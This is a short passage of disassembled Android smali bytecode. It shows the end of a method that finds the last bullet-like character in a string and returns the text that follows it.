    if-ge v1, v2, :cond_2

    .line 613
    invoke-virtual {p0, v1}, Ljava/lang/String;->charAt(I)C

    move-result v2

    const/16 v3, 0x2022

    if-eq v2, v3, :cond_0

    const/16 v3, 0x25cf

    if-eq v2, v3, :cond_0

    const/16 v3, 0x2a

    if-eq v2, v3, :cond_0

    const/16 v3, 0x25c9

    if-eq v2, v3, :cond_0

    const/16 v3, 0x2b24

    if-ne v2, v3, :cond_1

    :cond_0
    move v0, v1

    :cond_1
    add-int/lit8 v1, v1, 0x1

    goto :goto_0

    :cond_2
    if-ltz v0, :cond_3

    add-int/lit8 v0, v0, 0x1

    .line 618
    invoke-virtual {p0, v0}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object p0

    :cond_3
    return-object p0
.end method
